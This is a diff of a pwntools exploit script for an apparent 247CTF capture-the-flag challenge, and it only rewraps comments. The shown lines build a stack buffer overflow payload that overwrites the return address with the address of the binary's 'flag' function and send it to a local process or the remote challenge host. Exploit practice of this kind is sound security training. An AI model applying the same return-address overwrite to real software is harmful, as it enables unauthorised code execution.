@@ -24,7 +24,8 @@ context.log_level = 'info'
 context.delete_corefiles = True
 
 def get_offset():
-    '''Return the offset from where our input is stored on the stack to the return address.
+    '''Return the offset from where our input is stored on the stack to the
+return address.
     '''
 
     with process([exe.path]) as io:
@@ -50,7 +51,8 @@ def conn():
     '''Establish the connection to the process, local or remote.
     '''
 
-    # This address probably won't work for you, as it is different for each person each 24 hours.
+    # This address probably won't work for you, as it is different for each
+    # person each 24 hours.
     if args.get('REMOTE'):
         io = remote('c823368be98d997b.247ctf.com', 50119)
 
@@ -70,11 +72,13 @@ def main():
 
     with conn() as io:
 
-        # Send the payload that will overwrite the return address with the address of the function`flag`.
+        # Send the payload that will overwrite the return address with the
+        # address of the function`flag`.
         flag_func = exe.symbols['flag']
         log.debug(f'The flag address is: {hex(flag_func)}')
 
-        # Create and send the payload that will overwrite the return address with the address of the function`flag`.
+        # Create and send the payload that will overwrite the return address
+        # with the address of the function`flag`.
         payload = fit({
             offset: p32(flag_func, endian='little')
         })
